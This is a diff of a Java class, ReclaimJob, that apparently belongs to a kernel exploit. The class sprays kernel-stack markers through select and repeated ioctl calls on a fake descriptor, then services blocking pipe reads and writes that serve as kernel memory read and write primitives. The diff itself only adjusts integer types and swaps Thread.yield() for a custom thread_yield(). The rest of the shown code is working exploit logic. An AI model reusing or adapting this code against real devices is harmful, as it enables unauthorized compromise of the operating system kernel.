@@ -54,7 +54,7 @@ public class ReclaimJob extends CommonJob {
         this.jobName = "reclaim#" + index;
         this.marker = Config.RECLAIM_THREAD_MARKER_BASE | ((0x41 + index + 1) << 24);
         if (Config.markerMethod.getMarkerSize() > 0) {
-            this.markerAddress = this.state.reclaimJobStatesAddress.inc(index * ((long) Config.markerMethod.getMarkerSize()));
+            this.markerAddress = this.state.reclaimJobStatesAddress.inc(index * Config.markerMethod.getMarkerSize());
             this.markerCopyAddress = this.markerAddress.inc(Config.markerMethod.getMarkerSize() / 2);
         } else {
             this.markerAddress = Pointer.NULL;
@@ -94,8 +94,8 @@ public class ReclaimJob extends CommonJob {
         if (Config.markerMethod == KernelStackMarkerMethod.BLOCKING_SELECT) {
             markerAddress.write8(((long) marker) << 32);
         } else if (Config.markerMethod == KernelStackMarkerMethod.IOCTL) {
-            final int count = Config.markerMethod.getMarkerSize() / 4;
-            for (int i = 0; i < count; i++) {
+            final long count = Config.markerMethod.getMarkerSize() / 4;
+            for (long i = 0; i < count; i++) {
                 markerAddress.write4(i * 0x4, marker);
             }
         }
@@ -104,7 +104,7 @@ public class ReclaimJob extends CommonJob {
     protected void work() throws SdkException {
         DebugStatus.trace("Waiting for ready flag");
         while (!this.state.readyFlag.get()) {
-            Thread.yield();
+            thread_yield();
         }
 
         DebugStatus.trace("Starting loop");
@@ -116,15 +116,15 @@ public class ReclaimJob extends CommonJob {
                 DebugStatus.trace("Doing blocking call");
 
                 // Use copy of marker because `select` may overwrite its contents.
-                markerAddress.copyTo(markerCopyAddress, 0, Config.markerMethod.getMarkerSize() / 2);
+                markerAddress.copyTo(markerCopyAddress, 0, (int) (Config.markerMethod.getMarkerSize() / 2));
                 this.libKernel.select(1, markerCopyAddress, Pointer.NULL, Pointer.NULL, this.state.timeoutAddress.getPointer());
-                Thread.yield();
+                thread_yield();
             } else if (Config.markerMethod == KernelStackMarkerMethod.IOCTL) {
                 final int fakeDescriptor = 0xBEEF;
                 for (int i = 0; i < Config.MAX_RECLAIM_SYSTEM_CALLS; i++) {
                     ioccom.ioctl(fakeDescriptor, IocCom._IOW(0, 0, Config.markerMethod.getMarkerSize()), markerAddress.addr());
                 }
-                Thread.yield();
+                thread_yield();
             } else {
                 this.libKernel.sched_yield(this.marker);
             }
@@ -146,7 +146,7 @@ public class ReclaimJob extends CommonJob {
         if (isTarget) {
             DebugStatus.debug("Waiting for ready flag");
             while (!this.state.readyFlag.get()) {
-                Thread.yield();
+                thread_yield();
             }
 
             // Lock execution temporarily using blocking call by reading from empty pipe.
@@ -234,14 +234,14 @@ public class ReclaimJob extends CommonJob {
                 commandWaitFlag.set(false);
             }
 
-            Thread.yield();
+            thread_yield();
         }
     }
 
     protected void handleCommandRead(long srcAddress, long dstAddress, long size) {
         DebugStatus.trace("Doing blocking write");
 
-        Thread.yield();
+        thread_yield();
 
         // Do blocking write pipe call.
         final long result = this.libKernel.write(this.state.writePipeDescriptor, this.state.pipeBufferAddress, size);
@@ -255,7 +255,7 @@ public class ReclaimJob extends CommonJob {
     protected void handleCommandWrite(long srcAddress, long dstAddress, long size) {
         DebugStatus.trace("Doing blocking read");
 
-        Thread.yield();
+        thread_yield();
 
         // Do blocking read pipe call.
         final long result = this.libKernel.read(this.state.readPipeDescriptor, this.state.pipeBufferAddress, size);
